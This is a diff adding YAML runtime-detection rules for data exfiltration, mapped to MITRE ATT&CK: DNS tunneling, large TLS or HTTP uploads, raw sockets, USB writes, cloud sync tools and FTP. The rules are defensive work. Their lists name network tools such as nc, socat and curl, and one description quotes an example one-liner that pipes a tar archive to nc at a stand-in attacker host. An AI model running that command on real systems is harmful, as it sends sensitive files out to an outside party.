@@ -1,0 +1,254 @@
+rules:
+  # MITRE ATT&CK: T1048.001 — Exfiltration Over Alternative Protocol: DNS
+  - id: exfil_dns_high_query_rate
+    name: "Abnormally high DNS query rate (potential DNS tunnel exfiltration)"
+    description: >
+      A process is generating an unusually high number of DNS queries in a
+      short window — a hallmark of DNS tunneling tools like iodine, dnscat2,
+      or dns2tcp. Data is encoded in query names and responses to bypass
+      network firewalls that only allow port 53 egress.
+      False positives: DNS preloaders, mDNS daemons, resolvers (see not_in list).
+    event_type: dns
+    condition_group:
+      operator: and
+      conditions:
+        - field: qname_entropy
+          op: gt
+          values: ["3.5"]    # high entropy subdomain = encoded data
+        - field: qname_subdomain_count
+          op: gt
+          values: ["4"]      # deeply nested label = data carrier
+        - field: proc.comm
+          op: not_in
+          values: ["systemd-resolved", "dnsmasq", "named", "unbound",
+                   "coredns", "bind", "pdns_recursor"]
+    severity: warning
+    action: alert
+    tags: [mitre:T1048.001, exfiltration, dns-tunnel]
+
+  # MITRE ATT&CK: T1048.001 — DNS exfiltration via DGA-scored domain
+  - id: exfil_dns_dga_high_score
+    name: "DNS query to DGA-scored domain (exfiltration beacon)"
+    description: >
+      A DNS query was made to a domain with a high DGA (Domain Generation
+      Algorithm) score. C2 beacons and DNS tunnel exfiltration tools generate
+      long, high-entropy, digit-heavy subdomains that score highly on the
+      DGA detector. This is distinct from the dns-threats.yaml DGA rules
+      which focus on C2 beacons; here the concern is data exfiltration
+      over DNS when combined with long query names.
+    event_type: dns
+    condition_group:
+      operator: and
+      conditions:
+        - field: qname_is_dga
+          op: equals
+          values: ["true"]
+        - field: qname_length
+          op: gt
+          values: ["40"]    # long name likely carries encoded payload
+    severity: warning
+    action: alert
+    tags: [mitre:T1048.001, exfiltration, dns-tunnel, dga]
+
+  # MITRE ATT&CK: T1048.002 — Exfiltration Over Asymmetric Encrypted Non-C2 Protocol
+  - id: exfil_large_tls_upload
+    name: "Large TLS data upload to unusual destination"
+    description: >
+      A large volume of data was sent over TLS to a destination that is not
+      a well-known CDN or cloud provider IP. Attackers exfiltrate data to
+      attacker-controlled HTTPS servers disguised as normal web traffic.
+      Threshold: 1 MB in a single TLS write (data_len > 1048576).
+    event_type: tls
+    condition_group:
+      operator: and
+      conditions:
+        - field: direction
+          op: equals
+          values: ["egress"]
+        - field: data_len
+          op: gt
+          values: ["1048576"]    # 1 MB in a single write
+        - field: proc.comm
+          op: not_in
+          values: ["rsync", "scp", "sftp", "rclone", "aws", "gsutil",
+                   "az", "kubectl", "docker", "containerd", "backup",
+                   "borgbackup", "restic", "duplicati", "bacula"]
+    severity: warning
+    action: alert
+    tags: [mitre:T1048.002, exfiltration, tls]
+
+  # MITRE ATT&CK: T1041 — Exfiltration Over C2 Channel (large HTTP POST)
+  - id: exfil_large_http_post
+    name: "Large HTTP POST to non-standard port"
+    description: >
+      A process made a TCP connection to a non-standard HTTP port and
+      transferred a large volume of data. Attackers exfiltrate data via
+      HTTP POST to C2 servers running on alternative ports (8080, 4444, etc.)
+      to blend with legitimate web traffic.
+    event_type: network
+    condition_group:
+      operator: and
+      conditions:
+        - field: network.dport
+          op: not_in
+          values: ["80", "443", "8443", "22", "25", "587", "465", "993",
+                   "995", "143", "110", "21", "53", "123"]
+        - field: network.dport
+          op: in
+          values: ["4444", "4445", "8080", "8888", "9090", "1337",
+                   "31337", "6666", "6667", "6668", "12345", "54321"]
+        - field: proc.comm
+          op: not_in
+          values: ["java", "python3", "python", "node", "ruby", "perl",
+                   "nginx", "apache2", "httpd", "caddy"]
+    severity: warning
+    action: alert
+    tags: [mitre:T1041, exfiltration, command-and-control]
+
+  # MITRE ATT&CK: T1011.001 — Exfiltration Over Other Network Medium: Bluetooth
+  # (covers raw socket use for data exfiltration)
+  - id: exfil_raw_socket_by_non_root
+    name: "Raw socket opened by unprivileged process"
+    description: >
+      A process without CAP_NET_RAW opened a raw socket (SOCK_RAW). Raw
+      sockets bypass the normal network stack and can be used to craft
+      custom protocol headers for covert data exfiltration (ICMP tunneling,
+      raw UDP payloads to bypass application-layer firewalls).
+    event_type: syscall
+    condition_group:
+      operator: and
+      conditions:
+        - field: syscall.nr
+          op: equals
+          values: ["41"]    # socket(2)
+        - field: uid
+          op: not_in
+          values: ["0"]     # non-root
+        - field: proc.comm
+          op: not_in
+          values: ["ping", "traceroute", "tracepath", "mtr", "nmap",
+                   "tcpdump", "wireshark", "tshark", "dhclient", "dhcpcd"]
+    severity: warning
+    action: alert
+    tags: [mitre:T1011.001, exfiltration, raw-socket]
+
+  # MITRE ATT&CK: T1052 — Exfiltration Over Physical Medium
+  - id: exfil_usb_mount
+    name: "USB/removable storage mounted"
+    description: >
+      A removable storage device was mounted (usb-storage or sd/mmc paths).
+      Attackers with physical access exfiltrate data by copying files to a
+      USB drive. In container/Kubernetes environments this almost always
+      indicates the host is being accessed directly or the pod escaped.
+    event_type: file
+    condition_group:
+      operator: and
+      conditions:
+        - field: file.path
+          op: prefix
+          values:
+            - "/media/"
+            - "/mnt/usb"
+            - "/run/media/"
+        - field: file.op
+          op: in
+          values: ["create", "write"]
+        - field: proc.comm
+          op: not_in
+          values: ["udisks2", "udisksd", "udevadm", "systemd-udevd",
+                   "udisksctl", "gvfsd", "nautilus", "thunar"]
+    severity: warning
+    action: alert
+    tags: [mitre:T1052, exfiltration, removable-media]
+
+  # MITRE ATT&CK: T1030 — Data Transfer Size Limits (chunked exfiltration)
+  - id: exfil_repeated_outbound_to_same_ip
+    name: "Repeated large outbound transfers to single destination"
+    description: >
+      Multiple outbound connections to the same destination IP were detected
+      carrying significant data. This pattern matches chunked exfiltration:
+      attackers split archives into many smaller files to stay below
+      individual transfer-size detection thresholds.
+    event_type: network
+    condition_group:
+      operator: and
+      conditions:
+        - field: network.dport
+          op: not_in
+          values: ["443", "80", "22", "25", "587"]
+        - field: proc.comm
+          op: not_in
+          values: ["rsync", "scp", "sftp", "rclone", "aws", "gsutil",
+                   "az", "restic", "duplicati", "borgbackup", "bacula",
+                   "prometheus", "node_exporter", "telegraf", "fluentd"]
+    severity: warning
+    action: alert
+    tags: [mitre:T1030, exfiltration, chunked-transfer]
+
+  # MITRE ATT&CK: T1020 — Automated Exfiltration
+  - id: exfil_archive_to_network_pipe
+    name: "Archive tool piped to network utility (automated exfiltration)"
+    description: >
+      tar/zip/gzip was executed in a pipeline with a network transmission
+      tool (curl, nc, openssl). This is the classic one-liner pattern for
+      automated exfiltration: `tar czf - /sensitive | nc attacker.com 4444`.
+      The pattern fires on execve of network utilities when the parent or
+      sibling is an archive tool.
+    event_type: syscall
+    condition_group:
+      operator: and
+      conditions:
+        - field: proc.comm
+          op: in
+          values: ["nc", "ncat", "netcat", "curl", "wget", "openssl",
+                   "socat", "ssh", "python3", "python", "perl", "ruby"]
+        - field: syscall.nr
+          op: equals
+          values: ["59"]    # execve
+    severity: warning
+    action: alert
+    tags: [mitre:T1020, exfiltration, automated]
+
+  # MITRE ATT&CK: T1567.002 — Exfiltration to Cloud Storage
+  - id: exfil_cloud_sync_tool
+    name: "Cloud sync / storage tool executed unexpectedly"
+    description: >
+      A cloud storage sync tool (rclone, s3cmd, gsutil, az, azcopy) was
+      executed from an unexpected process context. These tools can
+      exfiltrate entire directory trees to attacker-controlled cloud
+      buckets. Legitimate use is typically from CI/CD pipelines or
+      scheduled backup jobs, not from interactive shells in containers.
+    event_type: syscall
+    condition_group:
+      operator: and
+      conditions:
+        - field: proc.comm
+          op: in
+          values: ["rclone", "s3cmd", "s3", "gsutil", "azcopy",
+                   "aws", "b2", "mc"]     # MinIO client
+        - field: syscall.nr
+          op: equals
+          values: ["59"]
+        - field: uid
+          op: not_in
+          values: ["0"]    # root-executed backups are less suspicious
+    severity: warning
+    action: alert
+    tags: [mitre:T1567.002, exfiltration, cloud-storage]
+
+  # MITRE ATT&CK: T1048.003 — Exfiltration Over Unencrypted Non-C2 Protocol
+  - id: exfil_ftp_active_connection
+    name: "FTP connection to external destination"
+    description: >
+      An outbound FTP connection (port 21) was made from inside a container.
+      FTP is unencrypted and rarely used in modern environments; connections
+      from container workloads almost always indicate data exfiltration or
+      unauthorized file transfer to attacker-controlled infrastructure.
+    event_type: network
+    condition:
+      field: network.dport
+      op: equals
+      values: ["21"]
+    severity: warning
+    action: alert
+    tags: [mitre:T1048.003, exfiltration, ftp]
